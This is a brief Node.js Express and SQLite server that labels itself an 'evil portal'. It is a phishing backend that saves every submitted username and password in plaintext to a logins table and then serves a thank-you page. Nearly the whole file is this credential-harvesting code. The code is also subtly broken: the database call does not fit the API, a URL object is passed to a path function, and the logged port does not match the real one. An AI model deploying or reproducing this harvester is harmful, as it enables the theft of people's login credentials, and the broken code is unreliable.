import { DatabaseSync } from 'node:sqlite'
import express from 'express'
import path from 'node:path'
import { pathToFileURL } from 'node:url'

const db = new DatabaseSync('./logins.db')
const app = express()

db.exec(`CREATE TABLE IF NOT EXISTS logins (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`)

// static files (HTML, CSS)
app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

// handle login
app.post('/login', (req, res) => {
    const { username, password } = req.body
    db.run(`INSERT INTO logins (username, password) VALUES (?, ?)`, [
        username,
        password,
    ])
    res.sendFile(
        path.join(
            path.dirname(pathToFileURL(import.meta.url)),
            'public',
            'thankyou.html'
        )
    )
})

app.listen(8000, () => console.log('evil portal on port 8080'))
